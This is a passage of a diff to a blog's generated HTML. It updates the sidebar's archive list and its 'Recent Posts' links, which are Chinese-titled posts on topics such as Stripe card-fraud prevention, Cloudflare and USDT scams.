class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
     </div>
   </div>
 
@@ -1031,6 +1081,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2024/08/03/stripe-fraud/index/">Stripe 如何安全收款并避免盗刷与测卡</a>
+          </li>
         
           <li>
             <a href="/2024/07/27/hide-in-cf/index/">隐藏于 Cloudflare 的全球网络之中</a>
@@ -1046,10 +1100,6 @@
         
           <li>
             <a href="/2024/04/30/usdt-trc20-scam/index/">警惕USDT-TRC20 数字货币诈骗</a>
-          </li>
-        
-          <li>
-            <a href="/2024/04/21/telegram-login-widget-verify-data/index/">Telegram Login Widget 如何验证用户数据</a>
           </li>
         
       </ul>
